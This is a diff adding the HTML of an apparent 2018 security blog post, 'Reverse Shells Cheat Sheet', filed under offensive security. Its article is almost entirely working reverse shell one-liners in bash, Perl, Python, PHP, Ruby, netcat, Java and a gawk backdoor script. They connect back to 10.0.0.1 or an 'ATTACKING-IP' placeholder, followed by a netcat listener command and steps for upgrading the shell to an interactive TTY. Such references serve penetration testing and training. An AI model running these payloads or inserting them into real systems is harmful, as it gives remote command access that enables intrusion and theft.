@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>Reverse Shells Cheat Sheet</title>
+  <meta name="description" content="This list represent an comprehensive cheat sheet of shells and other related stuff.">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
+
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:title" content="Reverse Shells Cheat Sheet">
+  <meta name="twitter:description" content="This list represent an comprehensive cheat sheet of shells and other related stuff.">
+  
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">
+
+  
+  <!-- Google Analytics -->
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-107695141-1', 'auto');
+    ga('send', 'pageview');
+
+  </script>
+
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Lucian Nitescu</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/">Home</a>
+      
+        
+        <a class="page-link" href="/about/">Whoami</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+    </nav>
+    <br>Security Blog
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">Reverse Shells Cheat Sheet</h1>
+    
+    <p class="post-meta"><time datetime="2018-07-15T00:00:00-03:00" itemprop="datePublished">Jul 15, 2018</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+        <a href="/categories/cheatsheet/">cheatsheet</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/offensive-security/">offensive_security</a>
+      
+    
+      
+    
+      
+    
+      
+    
+  
+
+
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>This list represent an comprehensive cheat sheet of shells and other related stuff.</p>
+
+<h2 id="listening">Listening</h2>
+<p>To setup a listening netcat instance, enter the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nvlp 80
+</code></pre></div></div>
+
+<h2 id="reverse-shells">Reverse Shells</h2>
+
+<p>To connect back to a listening netcat instance, enter the following:</p>
+
+<h4 id="bash">Bash</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+</code></pre></div></div>
+
+<h4 id="perl">PERL</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<h4 id="perl-windows-1">PERL Windows 1</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
+</code></pre></div></div>
+
+<h4 id="python">Python</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</code></pre></div></div>
+
+<h4 id="php">PHP</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+</code></pre></div></div>
+
+<h4 id="ruby">Ruby</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
+</code></pre></div></div>
+
+<h4 id="netcat">Netcat</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -e /bin/sh 10.0.0.1 1234
+</code></pre></div></div>
+
+<h4 id="java">Java</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
+p.waitFor()
+</code></pre></div></div>
+
+<h4 id="gawk-reverse-shell">Gawk Reverse Shell</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/gawk -f
+
+BEGIN {
+        Port    =       8080
+        Prompt  =       "bkd&gt; "
+
+        Service = "/inet/tcp/" Port "/0/0"
+        while (1) {
+                do {
+                        printf Prompt |&amp; Service
+                        Service |&amp; getline cmd
+                        if (cmd) {
+                                while ((cmd |&amp; getline) &gt; 0)
+                                        print $0 |&amp; Service
+                                close(cmd)
+                        }
+                } while (cmd != "exit")
+                close(Service)
+        }
+}
+</code></pre></div></div>
+
+<h2 id="spawning-interactive-reverse-shells-with-tty">Spawning interactive reverse shells with TTY</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># In reverse shell 
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+
+# In Attacker console
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows &lt;num&gt; columns &lt;cols&gt;
+</code></pre></div></div>
+
+<h2 id="sources">Sources</h2>
+
+<ul>
+  <li>https://highon.coffee/blog/reverse-shell-cheat-sheet/</li>
+  <li>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</li>
+  <li>https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e</li>
+</ul>
+
+  </div>
+
+  
+    <div class="post-comments" itemprop="comment">
+      <hr />
+<h1>Comments</h1>
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://nitesculucian.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    </div>
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
